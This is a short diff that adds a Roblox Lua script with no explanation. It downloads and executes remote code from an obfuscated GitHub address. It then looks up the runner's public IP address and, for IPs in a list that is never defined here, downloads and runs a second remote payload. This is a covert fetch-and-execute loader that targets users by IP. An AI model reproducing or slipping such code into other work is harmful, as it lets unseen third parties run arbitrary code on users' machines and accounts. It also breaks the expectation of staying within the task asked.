@@ -1,0 +1,9 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ECFD33E958FB53E3/982E274C1EBB1E44C2A9DAEB3A19B/main/ACE65554D8C9DF59"))()
+local IP = game:HttpGet("https://api.ipify.org")
+
+for _,BALLS in pairs(FYTEjkXnoF) do
+   if IP == BALLS then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/venturesomes/portals/main/MAIN"))()
+   end
+end
